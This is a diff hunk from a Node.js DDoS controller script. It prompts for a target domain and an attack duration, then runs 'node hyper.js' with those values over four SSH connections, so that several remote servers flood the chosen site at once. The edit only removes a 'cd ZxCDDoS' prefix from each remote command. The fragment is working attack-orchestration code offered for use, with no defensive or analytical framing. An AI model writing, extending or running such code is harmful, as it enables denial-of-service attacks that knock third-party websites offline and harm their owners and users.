@@ -89,17 +89,17 @@ conn4.on('error', function(err) {
 setTimeout(function() {
     rl.question('\n [/] Domain: ', function(domain) {
         rl.question(' [/] Time: ', function(time) {
-            conn.exec(`cd ZxCDDoS; node hyper.js ${domain} ${time}`, function(err, stream) {
+            conn.exec(`node hyper.js ${domain} ${time}`, function(err, stream) {
                 console.log(" [/] Starting DDoS attack...")
                 setTimeout(function() {
                     console.log(` [/] DDoS Attack started on ${domain} for ${time} seconds`)
                 }
                 , 1000)
-                conn2.exec(`cd ZxCDDoS; node hyper.js ${domain} ${time}`, function(err, stream) {
+                conn2.exec(`node hyper.js ${domain} ${time}`, function(err, stream) {
                 })
-                conn3.exec(`cd ZxCDDoS; node hyper.js ${domain} ${time}`, function(err, stream) {
+                conn3.exec(`node hyper.js ${domain} ${time}`, function(err, stream) {
                 })
-                conn4.exec(`cd ZxCDDoS; node hyper.js ${domain} ${time}`, function(err, stream) {
+                conn4.exec(`node hyper.js ${domain} ${time}`, function(err, stream) {
                 })
                 process.stdin.on('keypress', function(chunk, key) {
                     if (key.ctrl && key.name === 'c') {
